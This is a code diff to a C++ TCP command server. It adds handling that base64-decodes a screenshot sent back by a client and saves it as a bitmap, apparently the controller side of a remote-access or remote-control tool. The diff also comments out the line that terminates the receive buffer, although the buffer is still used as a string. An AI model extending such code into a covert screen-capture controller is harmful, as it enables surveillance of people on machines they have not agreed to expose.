@@ -1,5 +1,6 @@
 #include <iostream>
 #include "TCPServer.h"
+#include "base64.h"
 
 using namespace std;
 
@@ -55,12 +56,27 @@ int main() {
                 cout << "Server: error receiving data or connection closed" << endl;
                 return -1;
             } else {
-                receiveBuffer[byteCount] = '\0';
+        //         receiveBuffer[byteCount] = '\0';
 
-                cout << "Received data from "
-          << server->getClientIP() << ":"
-          << server->getClientPort()
-          << " : " << "\033[32m" << receiveBuffer << "\033[0m" << endl;
+        //         cout << "Received data from "
+        //   << server->getClientIP() << ":"
+        //   << server->getClientPort()
+        //   << " : " << "\033[32m" << receiveBuffer << "\033[0m" << endl;
+                if (strncmp(sendBuffer, "screenshot", 10) == 0) {
+                    std::string base64Data(receiveBuffer);
+                    std::vector<unsigned char> imageData = base64_decode(base64Data);
+
+                    std::ofstream outFile("received_screenshot.bmp", std::ios::binary);
+                    outFile.write(reinterpret_cast<const char*>(imageData.data()), imageData.size());
+                    outFile.close();
+
+                    cout << "Screenshot saved as received_screenshot.bmp" << endl;
+                } else {
+                    cout << "Received data from "
+                        << server->getClientIP() << ":"
+                        << server->getClientPort()
+                        << " : " << "\033[32m" << receiveBuffer << "\033[0m" << endl;
+                }
             }
 
             //PROMPT FOR COMMAND AGAIN
